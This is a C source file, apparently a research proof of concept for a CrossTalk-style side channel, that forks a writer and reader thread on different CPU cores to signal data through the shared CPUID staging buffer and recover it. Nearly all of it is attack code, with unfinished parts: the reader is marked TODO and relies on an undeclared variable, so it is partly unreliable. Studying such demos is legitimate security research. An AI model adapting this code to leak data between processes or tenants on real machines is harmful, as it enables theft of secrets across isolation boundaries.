#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"
#include <string.h>


#define CYCLE_LENGTH 6000000

// cpu_byte_0 = first byte of CPUID brand string 1
// thermal_byte_0 = same byte in the staging buffer, but contains the value after executing cpuid with leaf 0x6
uint8_t cpu_byte_0, thermal_byte_0;

void attacker_write_char(int cpu){
    set_processor_affinity(cpu);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);

    char* leak_candidate_string = sample_strings[rand() % sample_string_count];
    int leak_pos = 0;

    while(1){
        if (leak_pos >= strlen(leak_candidate_string))
            break;

        usleep(CYCLE_LENGTH);
        uint64_t random_number;
        asm volatile("rdrand %0":"=r"(random_number):);

        random_number = random_number & 0xFF;

        if ((char)random_number == leak_candidate_string[leak_pos]) {
            //I 'throw away' the return value on purpose to reuse code
            prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);

            while (!staging_buffer_byte_changed(mem, 0, cpu_byte_0)){}
        }
    }
}

void attacker_read_char(int cpu, int reps){
    //TODO: Implement correct reader
    set_processor_affinity(cpu);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    char staging_buffer[65];
    staging_buffer[64] = 0;

    while(reps--){
        asm volatile(
        "mov $0x80000004, %%eax\n"
        "cpuid\n"
        "mfence\n"
        :::"eax");
        while (!staging_buffer_byte_changed(mem, 32, byte_32)){}
        uint64_t random_number = 0;
        vector_read(mem, 20000, staging_buffer, 32, 40, 0);
        for(int i = 0; i < 8; i++) {
            random_number = random_number << 8;
            random_number += staging_buffer[32 + (8 - i - 1)];
        }
        printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
        fflush(stdout);
    }
    munmap(mem-1, _page_size * 257);
}

int main(int argc, char **args) {
    printf("Demo 3: Transmitting data across cores.\n\n");
    _page_size = getpagesize();
    printf("Running attacker threads on CPU %d and %d.", reader_cpu, writer_cpu);
    fflush(stdout);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    cpu_byte_0 = prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);
    thermal_byte_0 = prime_and_get_cpuid(CPUID_THERMAL_STRING_PRIMITIVE);
    pid = fork();
    if (!pid) attacker_write_char(writer_cpu);
    attacker_read_char(reader_cpu, 50);
    munmap(mem-1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

